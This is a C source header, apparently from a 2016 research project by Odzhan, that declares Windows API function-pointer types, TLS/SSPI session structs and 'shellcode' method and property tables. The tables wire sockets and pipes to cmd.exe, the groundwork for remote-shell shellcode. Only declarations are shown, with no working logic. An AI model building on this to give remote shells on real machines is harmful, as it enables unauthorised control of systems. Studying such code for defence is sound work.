/**
  Copyright © 2016 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define SECURITY_WIN32 // for sspi

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stddef.h>

#include <ws2tcpip.h>
#include <winsock2.h>
#include <windows.h>
#include <winnt.h>
#include <wincrypt.h>
#include <wintrust.h>
#include <schannel.h>
#include <security.h>
#include <sspi.h>
  
//#define DEBUG 1 // only for compiling as executable

#if defined(DEBUG) && DEBUG > 0
 #define DEBUG_PRINT(...) { \
   fprintf(stderr, "\nDEBUG: %s:%d:%s(): ", __FILE__, __LINE__, __FUNCTION__); \
   fprintf(stderr, __VA_ARGS__); \
 }
#else
 #define DEBUG_PRINT(...) // Don't do anything in release builds
#endif

#pragma intrinsic(memcmp, memcpy, memset)

#define memcpy(x,y,z) __movsb(x,y,z)
#define memmove(x,y,z) __movsb(x,y,z)
#define memset(x,y,z) __stosb(x,y,z)

//
//
// structures
//
//
typedef struct tcp_ctx_t {
  char   *address, *port;
  int    s, ai_addrlen;
  HANDLE sck_evt;
  struct sockaddr     *ai_addr;
  struct sockaddr_in  v4;
  struct sockaddr_in6 v6;  
  char                ip[INET6_ADDRSTRLEN];  
} tcp_ctx;

typedef struct tls_ctx_t {
  SECURITY_STATUS           ss;
	HMODULE                   lib;
	PSecurityFunctionTable    sspi;
	HCERTSTORE                cert;
  SecPkgContext_StreamSizes sizes;
} tls_ctx;

typedef struct tls_session_t {
	int                 established, start, sck, secure;
	int                 failed, read_alerts, write_alerts;

	SCHANNEL_CRED       sc;
	CredHandle          cc;
	CtxtHandle          ctx;
  TimeStamp           ts;
  SecBuffer           pExtra;
  
  uint8_t             *buf;
  DWORD               buflen, maxlen;
  char                *address, *port;
  int                 s, ai_addrlen;
  struct sockaddr     *ai_addr;
  struct sockaddr_in  v4;
  struct sockaddr_in6 v6;  
  char                ip[INET6_ADDRSTRLEN];   
} tls_session;

typedef struct cmd_session_t {
  HANDLE in[2], out[2];
  HANDLE evt[4];
  DWORD  evt_cnt; 
} cmd_session;

typedef int (WINAPI* WSACleanup_t)(void);

typedef int (WINAPI* shutdown_t)(
    SOCKET s,
    int    how
);

typedef int (WSAAPI* getaddrinfo_t)(
    PCSTR            pNodeName,
    PCSTR            pServiceName,
    const ADDRINFOA  *pHints,
    PADDRINFOA       *ppResult
);

typedef void (WSAAPI* freeaddrinfo_t)(
    struct addrinfo *ai
);

typedef int (WINAPI* WSAStartup_t)(
    WORD      wVersionRequested,
    LPWSADATA lpWSAData
);

typedef SOCKET (WSAAPI* socket_t)(
    int af,
    int type,
    int protocol
);

typedef int (WINAPI* connect_t)(
    SOCKET                s,
    const struct sockaddr *name,
    int                   namelen
);

typedef int (WINAPI* send_t)(
    SOCKET s,
    const char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* recv_t)(
    SOCKET s,
    char   *buf,
    int    len,
    int    flags
);

typedef int (WINAPI* ioctlsocket_t)(
    SOCKET s,
    long   cmd,
    u_long *argp
);

typedef int (WINAPI* closesocket_t)(
    SOCKET s
);

typedef WSAEVENT (WINAPI* WSACreateEvent_t)(void);

typedef int (WINAPI* WSAEventSelect_t)(
    SOCKET   s,
    WSAEVENT hEventObject,
    long     lNetworkEvents
);

typedef int (WINAPI* WSAEnumNetworkEvents_t)(
    SOCKET             s,
    WSAEVENT           hEventObject,
    LPWSANETWORKEVENTS lpNetworkEvents
);

typedef HMODULE (WINAPI* LoadLibrary_t)(
    LPCTSTR lpFileName
);

typedef BOOL (WINAPI* CloseHandle_t)( HANDLE hFile);

typedef BOOL (WINAPI* CreateProcess_t)(
    LPCTSTR               lpApplicationName,
    LPTSTR                lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCTSTR               lpCurrentDirectory,
    LPSTARTUPINFO         lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);

typedef HANDLE (WINAPI* CreateThread_t)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);

typedef HANDLE (WINAPI* CreateEvent_t)(
    LPSECURITY_ATTRIBUTES lpEventAttributes,
    BOOL                  bManualReset,
    BOOL                  bInitialState,
    LPCTSTR               lpName
);

typedef BOOL (WINAPI* TerminateProcess_t)(
    HANDLE hProcess,
    UINT   uExitCode
);

typedef DWORD (WINAPI* WaitForMultipleObjects_t)(
    DWORD  nCount,
    const HANDLE *lpHandles,
    BOOL   bWaitAll,
    DWORD  dwMilliseconds
);

typedef BOOL (WINAPI* CreatePipe_t)(
    PHANDLE               hReadPipe,
    PHANDLE               hWritePipe,
    LPSECURITY_ATTRIBUTES lpPipeAttributes,
    DWORD                 nSize
);

typedef HANDLE (WINAPI* CreateNamedPipe_t)(
    LPCTSTR               lpName,
    DWORD                 dwOpenMode,
    DWORD                 dwPipeMode,
    DWORD                 nMaxInstances,
    DWORD                 nOutBufferSize,
    DWORD                 nInBufferSize,
    DWORD                 nDefaultTimeOut,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes
);

typedef HANDLE (WINAPI* CreateFile_t)(
    LPCTSTR               lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
);

typedef BOOL (WINAPI* ReadFile_t)(
    HANDLE       hFile,
    LPVOID       lpBuffer,
    DWORD        nNumberOfBytesToRead,
    LPDWORD      lpNumberOfBytesRead,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* WriteFile_t)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);

typedef BOOL (WINAPI* GetOverlappedResult_t)(
    HANDLE       hFile,
    LPOVERLAPPED lpOverlapped,
    LPDWORD      lpNumberOfBytesTransferred,
    BOOL         bWait
);

typedef HANDLE (WINAPI* GetProcessHeap_t)(void);

typedef LPVOID (WINAPI* HeapAlloc_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    SIZE_T dwBytes
);

typedef LPVOID (WINAPI* HeapReAlloc_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    LPVOID lpMem,
    SIZE_T dwBytes
);

typedef BOOL (WINAPI* HeapFree_t)(
    HANDLE hHeap,
    DWORD  dwFlags,
    LPVOID lpMem
);

typedef FARPROC (WINAPI* GetProcAddress_t)(
    HMODULE hModule,
    LPCSTR  lpProcName
);

#define HTONS(x) ((((WORD)(x) & 0xff00) >> 8) | (((WORD)(x) & 0x00ff) << 8))

// shellcode methods
typedef struct _sc_methods_t {
  union {
    LPVOID api[27];
    struct {
      // kernel32
      GetProcAddress_t          pGetProcAddress;
      LoadLibrary_t             pLoadLibraryA;
      GetProcessHeap_t          pGetProcessHeap;
      HeapAlloc_t               pHeapAlloc;
      HeapReAlloc_t             pHeapReAlloc;
      HeapFree_t                pHeapFree;
      CreateNamedPipe_t         pCreateNamedPipe;
      CreatePipe_t              pCreatePipe;
      CreateFile_t              pCreateFile;
      WriteFile_t               pWriteFile;
      ReadFile_t                pReadFile;
      GetOverlappedResult_t     pGetOverlappedResult;
      CreateProcess_t           pCreateProcess;
      TerminateProcess_t        pTerminateProcess;
      CreateEvent_t             pCreateEvent;
      CloseHandle_t             pCloseHandle;
      WaitForMultipleObjects_t  pWaitForMultipleObjects;
      
      // ws2_32
      getaddrinfo_t             pgetaddrinfo;
      freeaddrinfo_t            pfreeaddrinfo;      
      socket_t                  psocket;
      connect_t                 pconnect;
      send_t                    psend;
      recv_t                    precv;
      closesocket_t             pclosesocket;
      ioctlsocket_t             pioctlsocket;
      WSAEventSelect_t          pWSAEventSelect;
      WSAEnumNetworkEvents_t    pWSAEnumNetworkEvents;
      WSACreateEvent_t          pWSACreateEvent;
      WSAStartup_t              pWSAStartup;
    };
  };
} m_tbl;

// shellcode properties
typedef struct _sc_properties_t {
  SOCKET              s;
  HANDLE              out1;    // CreateNamedPipe
  HANDLE              in0;     // CreatePipe read
  HANDLE              in1;     // CreatePipe write
  HANDLE              out0;    // CreateFile
  HANDLE              evt0;    // WSACreateEvent
  HANDLE              evt1;    // CreateEvent for cmd.exe
  PROCESS_INFORMATION pi;      //
  DWORD               evt_cnt; // number of events to monitor
} p_tbl;

// shellcode class
typedef struct sc_cls_t {
  m_tbl               m;       // methods    (code section)
  p_tbl               p;       // properties (data section)
} sc_cls;
